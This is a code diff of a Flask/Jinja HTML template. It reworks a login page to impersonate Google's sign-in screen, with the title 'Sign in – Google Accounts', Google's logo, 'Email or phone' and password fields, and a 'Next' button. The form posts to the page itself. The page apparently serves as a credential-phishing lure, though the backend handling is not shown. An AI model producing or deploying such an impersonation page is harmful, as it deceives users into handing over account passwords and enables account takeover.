@@ -2,24 +2,25 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Gmail</title>
+    <title>Sign in – Google Accounts</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
-    <div class="container gmail-container">
-        <img src="{{ url_for('static', filename='images/google-logo.png') }}" alt="Google Logo" class="logo">
+    <div class="container">
+        <div class="login-box">
+            <img src="{{ url_for('static', filename='images/google-logo.png') }}" class="logo" alt="Google">
 
-        <form method="POST" action="{{ url_for('main.login') }}">
-            <input type="text" name="username" placeholder="Email or phone" required>
-            
-            {% if error %}
+            <form method="POST">
+                <input type="text" name="username" placeholder="Email or phone" required>
+                {% if error %}
                 <p class="error">{{ error }}</p>
-            {% endif %}
-            
-            <input type="password" name="password" placeholder="Enter your password" required>
-            <button type="submit">Sign in</button>
-        </form>
-        <p class="forgot">Forgot email?</p>
+                {% endif %}
+                <input type="password" name="password" placeholder="Enter your password" required>
+                <button type="submit">Next</button>
+            </form>
+            <p class="footer">Forgot email?</p>
+        </div>
     </div>
 </body>
 </html>
